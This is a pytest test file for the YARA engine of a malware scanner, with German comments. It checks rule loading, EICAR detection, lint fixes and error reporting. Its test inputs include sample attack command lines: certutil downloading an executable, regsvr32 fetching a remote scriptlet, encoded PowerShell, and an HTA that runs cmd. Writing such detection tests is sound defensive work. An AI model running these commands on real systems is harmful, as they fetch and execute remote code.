from malaz.core.yara_engine import YaraEngine

EICAR = (
    rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$"
    rb"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


def test_rules_compile():
    engine = YaraEngine()
    assert engine.available
    assert engine.load_error is None
    assert engine.rule_count >= 1


def test_eicar_matches():
    engine = YaraEngine()
    matches = engine.scan(EICAR)
    assert any(m.rule == "EICAR_Test_File" for m in matches)
    assert any(m.severity.name == "CRITICAL" for m in matches)


def test_powershell_encoded_matches():
    engine = YaraEngine()
    matches = engine.scan(b"powershell -EncodedCommand SQBFAFgA")
    assert any(m.rule == "Suspicious_PowerShell_Encoded" for m in matches)


def test_clean_data_no_match():
    engine = YaraEngine()
    assert engine.scan(b"hello world, perfectly normal text") == []


def test_empty_data_no_match():
    engine = YaraEngine()
    assert engine.scan(b"") == []


def test_extended_rules_match():
    engine = YaraEngine()
    hta = b'<script>var x = new ActiveXObject("WScript.Shell"); x.Run("cmd");</script>'
    assert any(m.rule == "HTA_ActiveX_Dropper" for m in engine.scan(hta))
    # Neue laengere Signaturen (FP-Haertung): kurzes "TVqQAA" allein triggert
    # nicht mehr, der echte PE-DOS-Stub in Base64 ("TVqQAAM...") schon.
    assert any(m.rule == "Base64_Encoded_PE" for m in engine.scan(b"x TVqQAAM y"))
    assert not any(m.rule == "Base64_Encoded_PE" for m in engine.scan(b"x TVqQAA y"))
    assert any(m.rule == "Certutil_Decode_Abuse" for m in engine.scan(b"certutil -decode a b"))


def test_precompiled_yarc_rules_are_loaded(tmp_path):
    # docs/USAGE.md promise precompiled .yarc loading; the engine must honour it.
    import yara

    compiled = yara.compile(
        source='rule yarc_marker { strings: $a = "yarc_probe_42" condition: $a }'
    )
    compiled.save(str(tmp_path / "compiled.yarc"))
    engine = YaraEngine(rules_dir=tmp_path)
    assert engine.available
    assert engine.load_error is None
    assert engine.rule_count >= 1
    matches = engine.scan(b"contains yarc_probe_42 inside")
    assert any(m.rule == "yarc_marker" for m in matches)


def test_broken_yarc_reports_load_error(tmp_path):
    (tmp_path / "broken.yarc").write_bytes(b"kein gueltiges Regelformat")
    engine = YaraEngine(rules_dir=tmp_path)
    assert engine.load_error is not None
    assert "broken.yarc" in engine.load_error


def test_yarc_preferred_over_same_stem_source(tmp_path):
    # A .yarc next to its .yar source must suppress the source, otherwise
    # every rule would exist twice and fire duplicate findings.
    import yara

    (tmp_path / "dup.yar").write_text("rule dup_rule { condition: false }")
    yara.compile(filepath=str(tmp_path / "dup.yar")).save(str(tmp_path / "dup.yarc"))
    engine = YaraEngine(rules_dir=tmp_path)
    assert engine.load_error is None
    assert len(engine._rules) == 1  # nur der .yarc, nicht zusaetzlich der .yar


# -- Atom-Qualitaet (Befund aus dem Trail-of-Bits-yara_lint-Lauf) ------------- #

def _rule_files():
    from pathlib import Path

    return sorted(Path("rules/yara").glob("*.yar"))


def test_no_string_too_short_for_an_atom():
    """Kein String unter 4 Byte: er kann kein Atom bilden.

    yara_lint (E002) fand drei solcher Stellen: `-f ` in Certutil_Decode_Abuse,
    `/i:` in Regsvr32_SCT_Bypass und `%u` in JS_Obfuscation_Unescape. Ohne Atom
    prueft die Engine den String per Bytecode an JEDER Position — auf einem
    musterhaltigen 8-MB-Eingang gemessen 259 ms statt 25 ms (Legacy-Engine).

    Geprueft wird der Regeltext, weil das die Eigenschaft ist, die der Linter
    beanstandet; ein Scan-Test koennte die Langsamkeit nicht zuverlaessig
    abbilden.
    """
    import re

    offenders = []
    for path in _rule_files():
        for line in path.read_text(encoding="utf-8").splitlines():
            # Kommentarzeilen ueberspringen: sie enthalten die Erklaerung der
            # Korrektur und damit dieselben Literale, aber keinen Regelsyntax.
            if line.lstrip().startswith(("//", "/*", "*")):
                continue
            for match in re.finditer(r'\$(\w+)\s*=\s*"([^"]*)"', line):
                name, literal = match.group(1), match.group(2)
                if len(literal.encode()) < 4:
                    offenders.append(f"{path.name}: ${name} = {literal!r}")
    assert not offenders, (
        "Strings unter 4 Byte koennen kein YARA-Atom bilden:\n  "
        + "\n  ".join(offenders)
    )


def test_corrected_rules_still_detect():
    """Die drei korrigierten Regeln muessen ihre Faelle weiter erkennen."""
    engine = YaraEngine()
    cases = {
        "Certutil_Decode_Abuse": [
            b"certutil -decode a.b64 b.exe",
            b"certutil -urlcache -f http://x/a.exe a.exe",
        ],
        "Regsvr32_SCT_Bypass": [
            b"regsvr32 /s /u /i:http://x/a.sct scrobj.dll",
            b"regsvr32 /i:foo.sct scrobj.dll",
        ],
        "JS_Obfuscation_Unescape": [
            b"var s=unescape('%u0041%u0042'); var t=eval('x'); var u=fromCharCode(65);",
        ],
    }
    for rule, samples in cases.items():
        for sample in samples:
            hits = {m.rule for m in engine.scan(sample)}
            assert rule in hits, f"{rule} feuert nicht mehr auf {sample!r}"


def test_corrected_rules_keep_quiet_on_benign_input():
    """Die Verlaengerung darf keine neuen Treffer auf harmlosem Text erzeugen."""
    engine = YaraEngine()
    for data, rule in (
        (b"the certutil tool ships with Windows", "Certutil_Decode_Abuse"),
        (b"regsvr32 is a Windows utility", "Regsvr32_SCT_Bypass"),
        (b"var s = unescape('hello');", "JS_Obfuscation_Unescape"),
    ):
        hits = {m.rule for m in engine.scan(data)}
        assert rule not in hits, f"{rule} feuert jetzt auf harmlosen Text: {data!r}"


def test_laufzeitfehler_wird_gemeldet_nicht_verschluckt(monkeypatch):
    """Audit-Befund 4: ein werfender Regelsatz liess die Stufe lautlos verschwinden.

    ``except Exception: return []`` verwarf auch die bereits gesammelten
    Treffer und uebersprang alle weiteren Regelsaetze — ohne Indikator. Ein
    Ergebnis ohne YARA-Zeile sah danach aus wie ein sauberes.

    Der Nutzer-Grundsatz: was wir nicht geprueft haben, darf nicht wie
    geprueft aussehen.
    """
    from malaz.core.yara_engine import YaraEngine

    class _Werfend:
        def match(self, **_k):
            raise RuntimeError("timeout")

    class _Gut:
        def match(self, **_k):
            return []

    e = YaraEngine.__new__(YaraEngine)
    e._rules = [_Gut(), _Werfend()]
    e._disabled = set()
    e.load_error = None
    type(e).available = property(lambda self: True)
    try:
        e.scan(b"daten")
    finally:
        del type(e).available
    assert e.scan_error, "der Ausfall muss am Objekt sichtbar sein"


def test_ein_werfender_regelsatz_killt_die_anderen_nicht(monkeypatch):
    """Der Treffer des heilen Satzes darf nicht mitverworfen werden."""
    from malaz.core.yara_engine import YaraEngine

    class _Treffer:
        rule = "Test_Regel"
        namespace = "ns"

        def __init__(self) -> None:
            self.meta = {"severity": "high", "weight": 30}
            self.strings: list = []

    class _Gut:
        def match(self, **_k):
            return [_Treffer()]

    class _Werfend:
        def match(self, **_k):
            raise RuntimeError("timeout")

    e = YaraEngine.__new__(YaraEngine)
    e._rules = [_Gut(), _Werfend()]
    e._disabled = set()
    e.load_error = None
    type(e).available = property(lambda self: True)
    try:
        treffer = e.scan(b"daten")
    finally:
        del type(e).available
    assert [m.rule for m in treffer] == ["Test_Regel"], "Treffer ging verloren"


def test_yara_match_carries_author_for_drl_attribution(tmp_path):
    """DOC-019: DRL 1.1 requires the author in hit-based reports."""
    (tmp_path / "authored.yar").write_text(
        'rule authored_probe {\n'
        '  meta:\n'
        '    author = "Alice Example"\n'
        '    severity = "low"\n'
        '  strings:\n'
        '    $a = "author_probe_42"\n'
        '  condition:\n'
        '    $a\n'
        '}\n',
        encoding="utf-8",
    )
    engine = YaraEngine(rules_dir=tmp_path)
    assert engine.load_error is None
    hits = engine.scan(b"author_probe_42")
    assert hits and hits[0].author == "Alice Example"
